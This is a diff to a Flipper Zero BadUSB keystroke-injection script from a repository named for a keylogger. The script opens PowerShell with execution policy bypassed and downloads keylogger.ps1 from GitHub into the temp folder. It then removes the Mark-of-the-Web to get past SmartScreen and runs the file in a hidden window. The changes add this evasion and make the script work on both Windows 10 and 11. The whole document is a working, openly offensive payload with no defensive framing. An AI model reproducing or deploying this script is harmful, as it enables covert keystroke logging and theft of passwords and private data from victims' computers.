@@ -1,31 +1,54 @@
-REM Flipper BadUSB - all DELAY = 3000 ms (document errors)
-REM EN(US) layout. Repo: naturalniyaboba2077/flipper-keylogger
+REM Flipper BadUSB — Windows 10 / 11
+REM All DELAY 3000 ms (document errors). Keyboard layout EN(US) for STRING.
+REM Uses full path to Windows PowerShell 5.1 (avoids Win11 Terminal / pwsh hijack)
+REM Repo: naturalniyaboba2077/flipper-keylogger
 
 DEFAULT_DELAY 3000
+DEFAULT_STRING_DELAY 20
 
+REM wait for USB HID enumerate on Win10/11
 DELAY 3000
+
+REM Win+R (Run) — works on Win10 and Win11
 GUI r
 DELAY 3000
-STRING powershell -NoP -NonI -Ep Bypass
+
+REM explicit Windows PowerShell 5.1 (not Windows Terminal)
+STRING C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -Ep Bypass
 ENTER
 DELAY 3000
+
 STRING $ErrorActionPreference='SilentlyContinue'; $ProgressPreference='SilentlyContinue'
 ENTER
 DELAY 3000
-STRING try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
+
+REM Win10 often needs Tls12; Win11: Tls12+Tls13
+STRING try{$t=[Net.SecurityProtocolType]::Tls12; try{$t=$t-bor[Net.SecurityProtocolType]::Tls13}catch{}; [Net.ServicePointManager]::SecurityProtocol=$t}catch{try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}}
 ENTER
 DELAY 3000
+
 STRING $u='https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1'
 ENTER
 DELAY 3000
-STRING $p=$env:TEMP+'\k.ps1'
+
+STRING $p=Join-Path $env:TEMP 'k.ps1'
 ENTER
 DELAY 3000
+
+REM download: WebClient then IWR fallback (Win10/11)
 STRING try{(New-Object Net.WebClient).DownloadFile($u,$p)}catch{try{Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing}catch{}}
 ENTER
 DELAY 3000
-STRING if(Test-Path $p){Start-Process -FilePath powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -NonI -W Hidden -Ep Bypass -File $p"}
+
+REM Mark-of-the-Web unblock (SmartScreen / MOTW on downloaded files)
+STRING if(Test-Path $p){try{Unblock-File -Path $p -ErrorAction SilentlyContinue}catch{}; try{Remove-Item -Path ($p+':Zone.Identifier') -Force -ErrorAction SilentlyContinue}catch{}}
 ENTER
 DELAY 3000
+
+REM start detached via full path; hidden child; injector stays open 3s for docs
+STRING if(Test-Path $p){Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -WindowStyle Hidden -ArgumentList "-NoP -NonI -W Hidden -Ep Bypass -File `"$p`""}
+ENTER
+DELAY 3000
+
 STRING exit
 ENTER
